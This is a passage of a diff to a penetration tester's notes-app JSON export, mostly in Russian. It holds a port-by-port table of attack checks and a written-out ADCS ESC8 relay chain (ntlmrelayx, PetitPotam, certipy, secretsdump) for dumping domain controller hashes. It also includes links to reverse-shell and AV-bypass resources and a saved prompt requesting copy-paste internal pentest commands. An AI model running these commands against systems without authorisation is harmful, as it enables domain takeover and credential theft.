AS-REP Roast, kerbrute|\n|111|RPC/NFS|`showmount -e IP` → mount shares|\n|135|MSRPC|`rpcdump.py` / `IOXIDResolver.py` (найти скрытые интерфейсы)|\n|139/445|SMB|null session → shares → signing → relay|\n|389/636|LDAP|anon bind → users/descriptions|\n|1433|MSSQL|`sa:sa` / `sa:` → `xp_cmdshell`|\n|2049|NFS|`showmount -e IP` → `mount -t nfs IP:/share /mnt`|\n|3306|MySQL|`root:` / `root:root`|\n|3389|RDP|BlueKeep check, позже brute/spray|\n|5432|PostgreSQL|`postgres:postgres`|\n|5985|WinRM|evil-winrm с кредами|\n|6379|Redis|`redis-cli -h IP INFO` → RCE через module|\n|9200|Elasticsearch|`curl http://IP:9200/_cat/indices`|\n\n\n\n\n---еще проверка ADCS ESC8 без кредов если есть ADCS.\nубедиться можно зайдя на url http://dc.domenname.com/certsrv/certfnsh.asp если попросит логин пасс можно пробовать\n```bash\nterminal_1:\nsudo impacket-ntlmrelayx -t http://dc.domenname.com/certsrv/certfnsh.asp -smb2support -debug --adcs --template DomainController\n\nterminal_2:\nsudo python3 PetitPotam.py $my_ip $dc_ip\n\nterminal_1 в случае успеха:\ncertipy-ad auth -pfx DC11.pfx -dc-ip $dc_ip\n\nsudo impacket-secretsdump 'name.domen.com/dc01$@$dc_ip' -hashes 'aad3b435b51404eeaad3b435b51404ee:hash'\n\n```",
+      "tags": [],
+      "isFavorite": false,
+      "order": "3",
+      "createdAt": "2026-03-22T12:27:41.045Z",
+      "updatedAt": "2026-04-08T08:33:31.454Z",
+      "type": "notes"
+    },
+    {
       "id": "vui5r0ay7mmesj1aq",
       "folderId": "f_n4tkby",
       "title": "AD",
@@ -263,6 +332,18 @@
       "order": "3",
       "createdAt": "2026-03-06T11:07:45.362Z",
       "updatedAt": "2026-03-06T11:45:02.269Z",
+      "type": "notes"
+    },
+    {
+      "id": "ns4cswlsxmn1qg3h2",
+      "folderId": "f_n4tkby",
+      "title": "New Note",
+      "content": "# New Note\n\nStart writing...",
+      "tags": [],
+      "isFavorite": false,
+      "order": "4",
+      "createdAt": "2026-03-22T12:28:11.030Z",
+      "updatedAt": "2026-03-22T12:28:14.044Z",
       "type": "notes"
     },
     {
@@ -397,149 +478,423 @@
       "title": "Tools",
       "subItems": [
         {
-          "id": "li_pw4cfe",
-          "title": "https://github.com/enaqx/awesome-pentest",
-          "url": "enaqx/awesome-pentest",
-          "description": "",
+          "id": "3mda3qzp6mmi0dzhh",
+          "url": "https://github.com/bee-san/Ciphey",
+          "title": "Ciphey - для разгадывания шифров",
+          "favicon": "https://www.google.com/s2/favicons?domain=чайфи&sz=32",
           "tags": [],
-          "isFavorite": false
+          "isFavorite": false,
+          "order": 0,
+          "sectionId": "ndw1cb12jmmi0df5n",
+          "color": "#14b8a6"
+        },
+        {
+          "id": "li_pw4cfe",
+          "url": "enaqx/awesome-pentest",
+          "title": "https://github.com/enaqx/awesome-pentest",
+          "tags": [],
+          "isFavorite": false,
+          "order": 0,
+          "color": "#14b8a6"
         },
         {
           "id": "li_3sqjnu",
-          "title": "Hack-with-Github/Awesome-Hacking",
           "url": "https://github.com/Hack-with-Github/Awesome-Hacking",
-          "description": "Hack-with-Github/Awesome-Hacking",
+          "title": "Hack-with-Github/Awesome-Hacking",
           "tags": [],
-          "isFavorite": false
+          "isFavorite": false,
+          "order": 0,
+          "color": "#f97316"
         },
         {
           "id": "li_72gap6",
-          "title": "arch3rPro/PentestTools",
           "url": "https://github.com/arch3rPro/PentestTools",
-          "description": "arch3rPro/PentestTools",
+          "title": "arch3rPro/PentestTools",
           "tags": [],
-          "isFavorite": false
+          "isFavorite": false,
+          "order": 0
+        }
+      ],
+      "sections": [
+        {
+          "id": "ndw1cb12jmmi0df5n",
+          "title": "тулзы которые юзаю",
+          "order": 0,
+          "collapsed": false
         }
       ],
       "tags": [],
       "order": "2",
       "createdAt": "2026-03-06T18:47:50.203Z",
-      "updatedAt": "2026-03-06T19:00:01.824Z",
+      "updatedAt": "2026-03-16T07:55:25.512Z",
       "type": "links"
     },
     {
       "id": "i2l37j35nmm7sa5eq",
       "folderId": "f_hxxnip",
       "title": "links",
-      "sections": [
-        {
-          "id": "restored_data_section",
-          "title": "RestoredData",
-          "order": 0,
-          "collapsed": false
-        }
-      ],
       "subItems": [
         {
-          "id": "li_u0ggm7",
-          "title": "мой сайт",
-          "url": "https://ariyts.github.io/my-hub/",
-          "description": "",
-          "tags": [],
-          "isFavorite": false,
-          "sectionId": "restored_data_section"
-        },
-        {
-          "id": "li_tyeua0",
-          "title": "Шпора по АД",
-          "url": "https://wadcoms.github.io/#",
-          "description": "",
-          "tags": [],
-          "isFavorite": false,
-          "sectionId": "restored_data_section"
-        },
-        {
           "id": "li_6dix47",
-          "title": "Шпора по линуксу",
           "url": "https://gtfobins.org/",
-          "description": "",
+          "title": "Шпора по линуксу",
           "tags": [],
           "isFavorite": false,
-          "sectionId": "restored_data_section"
+          "order": 0,
+          "sectionId": "51olwcfjxmmhwoyce"
         },
         {
           "id": "li_twmaw3",
-          "title": "генератор шеллов",
           "url": "https://www.revshells.com/",
-          "description": "",
+          "title": "генератор шеллов",
           "tags": [],
           "isFavorite": false,
-          "sectionId": "restored_data_section"
+          "order": 1,
+          "sectionId": "51olwcfjxmmhwoyce",
+          "color": "#3b82f6"
         },
         {
           "id": "li_dxpv1v",
-          "title": "awesome-pentest-cheat-sheets",
           "url": "https://github.com/ByteSnipers/awesome-pentest-cheat-sheets?tab=readme-ov-file",
-          "description": "",
+          "title": "awesome-pentest-cheat-sheets",
           "tags": [],
           "isFavorite": false,
-          "sectionId": "restored_data_section"
+          "order": 2,
+          "sectionId": "51olwcfjxmmhwoyce",
+          "color": "#eab308"
         },
         {
-          "id": "li_2vqe8",
-          "title": "Hacktricks",
-          "url": "https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html#installer-style-uac-bait-before-tampering-with-defender",
-          "description": "",
+          "id": "li_rsk9n8",
+          "url": "ресурсы для OSCP",
+          "title": "ресурсы для OSCP",
           "tags": [],
           "isFavorite": false,
-          "sectionId": "restored_data_section"
+          "order": 3,
+          "sectionId": "51olwcfjxmmhwoyce",
+          "color": "#ef4444"
+        },
+        {
+          "id": "li_tc2osg",
+          "url": "https://github.com/Hack-with-Github/Awesome-Hacking",
+          "title": "https://github.com/Hack-with-Github/Awesome-Hacking",
+          "tags": [],
+          "isFavorite": false,
+          "order": 4,
+          "sectionId": "51olwcfjxmmhwoyce"
+        },
+        {
+          "id": "li_4wv3gu",
+          "url": "https://github.com/enaqx/awesome-pentest",
+          "title": "https://github.com/enaqx/awesome-pentest",
+          "tags": [],
+          "isFavorite": false,
+          "order": 5,
+          "sectionId": "51olwcfjxmmhwoyce"
         },
         {
           "id": "li_252l1h",
-          "title": "Internal All The Things",
           "url": "https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references",
-          "description": "шпора для АД",
+          "title": "Internal All The Things",
           "tags": [],
           "isFavorite": false,
-          "sectionId": "restored_data_section"
+          "order": 0,
+          "sectionId": "7d69gdrkxmmhyc7d7",
+          "color": "#f97316"
+        },
+        {
+          "id": "li_40ahuo",
+          "url": "https://github.com/arch3rPro/PentestTools",
+          "title": "https://github.com/arch3rPro/PentestTools",
+          "tags": [],
+          "isFavorite": false,
+          "order": 1,
+          "sectionId": "7d69gdrkxmmhyc7d7",
+          "color": "#22c55e"
+        },
+        {
+          "id": "li_u0ggm7",
+          "url": "https://ariyts.github.io/my-hub/",
+          "title": "мой сайт",
+          "tags": [],
+          "isFavorite": false,
+          "order": 2,
+          "sectionId": "7d69gdrkxmmhyc7d7",
+          "color": "#f97316"
+        },
+        {
+          "id": "trrwb6ynnmmotq5dr",
+          "url": "https://wadcoms.github.io/#",
+          "title": "Шпора по АД",
+          "favicon": "https://www.google.com/s2/favicons?domain=wadcoms.github.io&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 0,
+          "sectionId": "6rmvkflezmmotos0f"
+        },
+        {
+          "id": "ki8u3h4k7mmotqm16",
+          "url": "https://gtfobins.org/",
+          "title": "Шпора по линуксу",
+          "favicon": "https://www.google.com/s2/favicons?domain=gtfobins.org&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 1,
+          "sectionId": "6rmvkflezmmotos0f"
+        },
+        {
+          "id": "q4a48ksremmotqyux",
+          "url": "https://www.revshells.com/",
+          "title": "генератор шеллов",
+          "favicon": "https://www.google.com/s2/favicons?domain=www.revshells.com&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 2,
+          "sectionId": "6rmvkflezmmotos0f"
+        },
+        {
+          "id": "mrdx1h1f3mmotrfsv",
+          "url": "https://github.com/ByteSnipers/awesome-pentest-cheat-sheets",
+          "title": "awesome-pentest-cheat-sheets",
+          "favicon": "https://www.google.com/s2/favicons?domain=github.com&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 3,
+          "sectionId": "6rmvkflezmmotos0f"
+        },
+        {
+          "id": "xjse21sngmmotrrme",
+          "url": ".wiki/en/windows-hardening/av-bypass.html",
+          "title": "Hacktricks",
+          "favicon": "https://www.google.com/s2/favicons?domain=.wiki/en/windows-hardening/av-bypass.html&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 4,
+          "sectionId": "6rmvkflezmmotos0f"
+        },
+        {
+          "id": "22dfgqactmmots2wx",
+          "url": "https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references",
+          "title": "Internal All The Things",
+          "favicon": "https://www.google.com/s2/favicons?domain=swisskyrepo.github.io&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 5,
+          "sectionId": "6rmvkflezmmotos0f"
+        },
+        {
+          "id": "cukzwbv2cmms3qemg",
+          "url": "https://github.com/S3cur3Th1sSh1t/WinPwn",
+          "title": "WinPwn",
+          "favicon": "https://www.google.com/s2/favicons?domain=github.com&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 0,
+          "sectionId": "kqhk3b8bimms3q2sm"
+        },
+        {
+          "id": "pq4qyqo6pmms3v1ed",
+          "url": "https://github.com/S3cur3Th1sSh1t/Creds",
+          "title": "S3cur3Th1sSh1t/Creds",
+          "favicon": "https://www.google.com/s2/favicons?domain=github.com&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 1,
+          "sectionId": "kqhk3b8bimms3q2sm"
+        },
+        {
+          "id": "54kf8ela2mmt4qfhg",
+          "url": "https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg",
+          "title": "Карта атаки AD",
+          "favicon": "https://www.google.com/s2/favicons?domain=orange-cyberdefense.github.io&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 2,
+          "sectionId": "kqhk3b8bimms3q2sm",
+          "color": "#ef4444"
+        },
+        {
+          "id": "li_tyeua0",
+          "url": "https://wadcoms.github.io/#",
+          "title": "Шпора по АД",
+          "tags": [],
+          "isFavorite": false,
+          "order": 0,
+          "color": "#ef4444"
+        },
+        {
+          "id": "li_mc4pvk",
+          "url": "https://github.com/TeneBrae93",
+          "title": "https://github.com/TeneBrae93",
+          "tags": [],
+          "isFavorite": false,
+          "order": 1
+        },
+        {
+          "id": "li_umweg0",
+          "url": "https://github.com/sparshkulshrestha/OSCP-TRY-HARDER-/?source=post_page-----79b71e0baf99---------------------------------------",
+          "title": "https://github.com/sparshkulshrestha/OSCP-TRY-HARDER-/?source=post_page-----79b71e0baf99---------------------------------------",
+          "tags": [],
+          "isFavorite": false,
+          "order": 2
+        },
+        {
+          "id": "li_2vqe8",
+          "url": "https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html#installer-style-uac-bait-before-tampering-with-defender",
+          "title": "Hacktricks",
+          "tags": [],
+          "isFavorite": false,
+          "order": 3,
+          "color": "#f97316"
+        }
+      ],
+      "sections": [
+        {
+          "id": "51olwcfjxmmhwoyce",
+          "title": "test2",
+          "order": 0,
+          "collapsed": false
+        },
+        {
+          "id": "7d69gdrkxmmhyc7d7",
+          "title": "test3",
+          "order": 1,
+          "collapsed": false
+        },
+        {
+          "id": "6rmvkflezmmotos0f",
+          "title": "restered",
+          "order": 2,
+          "collapsed": false,
+          "color": "#3b82f6"
+        },
+        {
+          "id": "kqhk3b8bimms3q2sm",
+          "title": "Временная секция - потом разобрать",
+          "order": 3,
+          "collapsed": false
         }
       ],
       "tags": [],
       "order": "0",
       "createdAt": "2026-03-01T13:26:27.554Z",
-      "updatedAt": "2026-03-03T12:27:34.699Z",
+      "updatedAt": "2026-03-16T11:58:22.332Z",
       "type": "links"
     },
     {
       "id": "kjm2k4qgzmmbxecjq",
       "folderId": "f_hxxnip",
-      "title": "шпора OSCP-TRY-HARDER-",
+      "title": "youtube",
       "subItems": [
         {
-          "id": "li_hf7z43",
-          "title": "ресурсы для OSCP",
-          "url": "https://github.com/sparshkulshrestha/OSCP-TRY-HARDER-/?source=post_page-----79b71e0baf99---------------------------------------",
-          "description": "",
+          "id": "mbhg8qtpzmmytpasr",
+          "url": "https://www.youtube.com/@NetsecExplained/videos",
+          "title": "@NetsecExplained",
+          "favicon": "https://www.google.com/s2/favicons?domain=www.youtube.com&sz=32",
           "tags": [],
-          "isFavorite": false
+          "isFavorite": false,
+          "order": 0,
+          "sectionId": "6dal6iuqtmmytp00j"
+        },
+        {
+          "id": "23qmfm29emmytqxcr",
+          "url": "https://www.youtube.com/@HackerSploit/featured",
+          "title": "HackerSploit",
+          "favicon": "https://www.google.com/s2/favicons?domain=www.youtube.com&sz=32",
+          "tags": [],
+          "isFavorite": false,
+          "order": 1,
+          "sectionId": "6dal6iuqtmmytp00j"
+        },
+        {
+          "id": "li_hf7z43",
+          "url": "https://github.com/sparshkulshrestha/OSCP-TRY-HARDER-/?source=post_page-----79b71e0baf99---------------------------------------",
+          "title": "ресурсы для OSCP",
+          "tags": [],
+          "isFavorite": false,
+          "order": 0
         },
         {
           "id": "li_6c5h9k",
-          "title": "Дефолт скрипты по ад TeneBrae93",
           "url": "https://github.com/TeneBrae93",
-          "description": "TeneBrae93",
+          "title": "Дефолт скрипты по ад TeneBrae93",
           "tags": [],
-          "isFavorite": false
+          "isFavorite": false,
+          "order": 0
+        }
+      ],
+      "sections": [
+        {
+          "id": "6dal6iuqtmmytp00j",
+          "title": "channel",
+          "order": 0,
+          "collapsed": false
         }
       ],
       "tags": [],
       "order": "1",
       "createdAt": "2026-03-04T11:00:46.214Z",
-      "updatedAt": "2026-03-05T13:34:11.026Z",
+      "updatedAt": "2026-03-20T11:37:16.635Z",
       "type": "links"
     }
   ],
   "prompts": [
+    {
+      "id": "gebu61ih8mpihndl9",
+      "folderId": "f_qyjju9",
+      "title": "New Prompts",
+      "category": "General",
+      "subItems": [
+        {
+          "id": "h6i7nlr9pmpihnpmp",
+          "title": "32321",
+          "prompt": "32321",
+          "description": "",
+          "variables": [],
+          "tags": [],
+          "isFavorite": false,
+          "sectionId": "3cny1gf2empihnhte"
+        },
+        {
+          "id": "misvzm2hjmpihnywz",
+          "title": "331",
+          "prompt": "111",
+          "description": "",
+          "variables": [],
+          "tags": [],
+          "isFavorite": false,
+          "sectionId": "75b5tgsfkmpihnu5n"
+        },
+        {
+          "id": "5fq0tga1bmpiho4dh",
+          "title": "111",
+          "prompt": "22",
+          "description": "",
+          "variables": [],
+          "tags": [],
+          "isFavorite": false,
+          "sectionId": "75b5tgsfkmpihnu5n"
+        }
+      ],
+      "sections": [
+        {
+          "id": "3cny1gf2empihnhte",
+          "title": "2321",
+          "order": 0,
+          "collapsed": false
+        },
+        {
+          "id": "75b5tgsfkmpihnu5n",
+          "title": "323232",
+          "order": 1,
+          "collapsed": false
+        }
+      ],
+      "tags": [],
+      "order": "1",
+      "createdAt": "2026-05-23T15:13:23.853Z",
+      "updatedAt": "2026-05-23T15:13:58.565Z",
+      "type": "prompts"
+    },
     {
       "id": "g5in6n5mqmm7saez1",
       "folderId": "f_qyjju9",
@@ -554,225 +909,67 @@
           "variables": [],
           "tags": [],
           "isFavorite": false
+        },
+        {
+          "id": "pi_sccy08",
+          "title": "Pentest first 1 hour",
+          "prompt": "Ты — опытный специалист по внутреннему пентесту (internal network pentest, Active Directory, red team), с большим практическим опытом работы \"в поле\" на объектах.\n\nСценарий:\nЯ выхожу на объект для проведения внутреннего пентеста. У меня есть файл scope.txt со списком IP-адресов.\n\nМой стандартный старт:\n1) Запускаю responder:\nresponder -I eth0 -b -d -w -F --lm --disable-ess\n\n2) Запускаю быстрый nmap:\nnmap -iL scope.txt --top-ports 100 -sV --version-all -Pn -A -v -T4 -oA new_project_top100\n\n3) Запускаю полный скан:\nnmap -iL scope.txt -p- -sV --script=vuln --version-all -Pn -A -v -T4 -oA new_project_all_ports\n\nПосле этого у меня есть примерно 30–60 минут, пока идут сканы.\n\nЗадача:\nРаспиши ПОДРОБНЫЙ, практический гайд: что делать в первый час пентеста, пока nmap работает.\n\nТребования:\n- Только практические действия, без теории\n- Конкретные команды (masscan, crackmapexec/netexec, smbclient, rpcclient, ldapsearch, enum4linux, kerbrute и т.д.)\n- Приоритизация: что делать в первые 5, 15, 30, 60 минут\n- Быстрые \"win\" действия (low hanging fruits)\n- Как быстро найти:\n  - SMB (445)\n  - AD (LDAP/Kerberos)\n  - открытые шары\n  - уязвимые сервисы\n- Использование masscan для ускорения (например: быстрый поиск 445/3389/5985 и т.д.)\n- Что можно параллелить\n- Как не шуметь слишком сильно (если это важно)\n- Что сразу даст креды / доступ\n- Какие команды запускать ПРЯМО СРАЗУ после получения первых IP\n\nОтдельно:\n- Дай блок \"быстрые команды\" (copy-paste ready)\n- Дай блок \"типичные ошибки в первый час\"\n- Дай блок \"если сеть AD / если не AD — что меняется\"\n\nОтвет должен быть структурирован, как чек-лист действий с командами.\nБез воды. Только то, что реально ускоряет взлом/доступ.",
+          "description": "",
+          "variables": [],
+          "tags": [],
+          "isFavorite": false
         }
       ],
+      "sections": [],
       "tags": [],
       "order": "0",
       "createdAt": "2026-03-01T13:26:39.949Z",
-      "updatedAt": "2026-03-01T14:02:53.625Z",
-      "type": "prompts",
-      "sections": []
+      "updatedAt": "2026-03-22T09:03:01.682Z",
+      "type": "prompts"
     }
   ],
-  "exportedAt": "2026-03-07T13:18:27.641Z",
-  "version": "3.0",
   "playbooks": [
     {
-      "id": "pb_git",
-      "folderId": "f_playbooks",
-      "title": "Git",
-      "description": "Version control system commands",
+      "id": "8ye778shtmpihohjd",
+      "folderId": "32tclf0rimpihof02",
+      "title": "smb",
+      "description": "",
       "subItems": [
         {
-          "id": "pb_git_1",
-          "command": "git log --oneline --graph --all",
-          "description": "Beautiful branch graph",
+          "id": "3teuiyn2smpihp8qg",
+          "command": "nxc smb $target -u '' -p '' --shares",
+          "description": "",
           "language": "bash",
-          "tags": [
-            "log",
-            "visual"
-          ],
-          "isFavorite": true
+          "tags": [],
+          "isFavorite": false,
+          "sectionId": "3rtw18f14mpihol2p"
         },
         {
-          "id": "pb_git_2",
-          "command": "git stash pop",
-          "description": "Apply stashed changes",
+          "id": "fw4aq1ymwmpihq5ia",
+          "command": "nxc smb $target -u 'guest' -p '' --shares",
+          "description": "",
           "language": "bash",
-          "tags": [
-            "stash"
-          ],
-          "isFavorite": false
-        },
-        {
-          "id": "pb_git_3",
-          "command": "git reset --soft HEAD~1",
-          "description": "Undo commit keeping changes",
-          "language": "bash",
-          "tags": [
-            "undo",
-            "commit"
-          ],
-          "isFavorite": true
-        },
-        {
-          "id": "pb_git_4",
-          "command": "git cherry-pick <commit-hash>",
-          "description": "Apply specific commit to current branch",
-          "language": "bash",
-          "tags": [
-            "commit",
-            "merge"
-          ],
-          "isFavorite": false
-        },
-        {
-          "id": "pb_git_5",
-          "command": "git rebase -i HEAD~5",
-          "description": "Interactive rebase last 5 commits",
-          "language": "bash",
-          "tags": [
-            "rebase",
-            "history"
-          ],
-          "isFavorite": false
+          "tags": [],
+          "isFavorite": false,
+          "sectionId": "3rtw18f14mpihol2p"
         }
       ],
-      "tags": [
-        "vcs",
-        "version-control"
-      ],
-      "order": 0,
-      "createdAt": "2026-05-13T00:00:00.000Z",
-      "updatedAt": "2026-05-13T00:00:00.000Z",
-      "type": "playbooks",
-      "isExpanded": true,
-      "sections": []
-    },
-    {
-      "id": "pb_docker",
-      "folderId": "f_playbooks",
-      "title": "Docker",
-      "description": "Container management commands",
-      "subItems": [
+      "sections": [
         {
-          "id": "pb_docker_1",
-          "command": "docker ps -a",
-          "description": "All containers including stopped",
-          "language": "bash",
-          "tags": [
-            "list",
-            "containers"
-          ],
-          "isFavorite": true
-        },
-        {
-          "id": "pb_docker_2",
-          "command": "docker system prune -a",
-          "description": "Clean all unused data",
-          "language": "bash",
-          "tags": [
-            "clean",
-            "maintenance"
-          ],
-          "isFavorite": false
-        },
-        {
-          "id": "pb_docker_3",
-          "command": "docker logs -f <container>",
-          "description": "Follow container logs",
-          "language": "bash",
-          "tags": [
-            "logs",
-            "debug"
-          ],
-          "isFavorite": true
-        },
-        {
-          "id": "pb_docker_4",
-          "command": "docker exec -it <container> /bin/bash",
-          "description": "Shell into running container",
-          "language": "bash",
-          "tags": [
-            "shell",
-            "debug"
-          ],
-          "isFavorite": true
-        },
-        {
-          "id": "pb_docker_5",
-          "command": "docker compose up -d --build",
-          "description": "Rebuild and start services in background",
-          "language": "bash",
-          "tags": [
-            "compose",
-            "deploy"
-          ],
-          "isFavorite": false
+          "id": "3rtw18f14mpihol2p",
+          "title": "smb",
+          "order": 0,
+          "collapsed": false,
+          "color": "#22c55e"
         }
       ],
-      "tags": [
-        "containers",
-        "devops"
-      ],
-      "order": 1,
-      "createdAt": "2026-05-13T00:00:00.000Z",
-      "updatedAt": "2026-05-13T00:00:00.000Z",
-      "type": "playbooks",
-      "isExpanded": true,
-      "sections": []
-    },
-    {
-      "id": "pb_ssh",
-      "folderId": "f_playbooks",
-      "title": "SSH",
-      "description": "Secure shell commands",
-      "subItems": [
-        {
-          "id": "pb_ssh_1",
-          "command": "ssh-copy-id user@host",
-          "description": "Copy key to remote server",
-          "language": "bash",
-          "tags": [
-            "keys",
-            "auth"
-          ],
-          "isFavorite": true
-        },
-        {
-          "id": "pb_ssh_2",
-          "command": "ssh -L 8080:localhost:80 user@host",
-          "description": "Local port forwarding (tunnel)",
-          "language": "bash",
-          "tags": [
-            "tunnel",
-            "forward"
-          ],
-          "isFavorite": true
-        },
-        {
-          "id": "pb_ssh_3",
-          "command": "ssh -D 1080 user@host",
-          "description": "SOCKS proxy via SSH",
-          "language": "bash",
-          "tags": [
-            "proxy",
-            "socks"
-          ],
-          "isFavorite": false
-        },
-        {
-          "id": "pb_ssh_4",
-          "command": "ssh-keygen -t ed25519 -C \"email\"",
-          "description": "Generate modern SSH key",
-          "language": "bash",
-          "tags": [
-            "keys",
-            "generate"
-          ],
-          "isFavorite": false
-        }
-      ],
-      "tags": [
-        "remote",
-        "security"
-      ],
-      "order": 2,
-      "createdAt": "2026-05-13T00:00:00.000Z",
-      "updatedAt": "2026-05-13T00:00:00.000Z",
-      "type": "playbooks",
-      "isExpanded": true,
-      "sections": []
+      "tags": [],
+      "order": "1",
+      "createdAt": "2026-05-23T15:14:15.625Z",
+      "updatedAt": "2026-05-23T15:16:11.335Z",
+      "type": "playbooks"
     }
-  ]
+  ],
+  "exportedAt": "2026-05-23T16:56:47.840Z",
+  "version": "3.0"
 }
